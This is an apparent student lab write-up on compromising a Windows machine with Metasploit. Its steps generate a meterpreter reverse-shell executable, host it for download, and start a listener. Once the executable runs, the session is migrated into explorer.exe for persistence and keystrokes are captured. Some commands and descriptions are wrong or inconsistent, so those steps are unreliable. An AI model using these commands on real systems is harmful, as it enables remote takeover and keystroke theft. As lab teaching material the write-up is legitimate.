# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/9f8fd562-1c07-4ef1-b2a2-557cd2a78a73)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/cf8a912e-d617-4847-b744-5d9ea61d853b)

 copy the fun.exe into the apache /var/www/html folder

 ![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/20561e95-478e-4824-a40f-59cd570f08c8)

Start apache server sudo systemctl apache2 start
![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/5b05a0ec-59d0-4a86-b2a3-5e10a1e67587)

Check the status of apache2
![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/77309e60-deb1-47ef-b9c5-f307f4ec1218)

## Invoke msfconsole:
OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit

![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/f2338383-b12c-407f-b544-4f3ed1d9f517)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.

![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/a923660d-5610-421c-b716-ac862f6190da)
Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/19184e12-a9c5-4c65-865c-9b81ee1dd9fe)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/1d562429-2067-4d71-86b0-29546a28bead)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/62fdc2c9-b6a2-4ea0-b4a8-8e1c5afcfebb)

keyscan_dump Shows the keystrokes captured so far
![image](https://github.com/skiruthika648/Compromising-windows-using-Metasploit/assets/128348968/546cde82-7d3b-4a84-92f0-e13a4a6c6646)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
